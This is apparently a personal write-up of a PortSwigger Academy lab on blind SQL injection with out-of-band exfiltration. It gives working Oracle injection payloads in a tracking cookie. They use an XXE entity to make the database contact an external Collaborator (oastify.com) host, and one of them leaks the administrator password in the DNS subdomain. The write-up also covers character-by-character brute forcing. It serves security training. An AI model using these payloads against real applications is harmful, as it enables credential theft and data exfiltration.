
# Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Learning path: If you're following our learning path, please note that the suggested solution for this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.


---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


The payload for out-of-band interaction is:

```
Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

We will try this:

```
SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) ELSE NULL END FROM dual
```

```
FFyToxqSs49lpxuC'+union+SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))!='a')+THEN+'a'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)+ELSE+NULL+END+FROM+dual--;
```

First I test it when the first character is different to “a” and see there is an interaction:



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/1.png)



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/2.png)

We send this to the Intruder and set two positions, one for the character for the comparison and the other the subdomain. We set the type to “Battering Ram”:



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/3.png)

We find there was a query for the letter “e”:



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/4.png)

Knowing this we could go character by character and get the password “e6jomps7kptnx04vcvtz”.

We can also use the query in the cheat-sheet:

```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```


```
mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```



![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/5.png)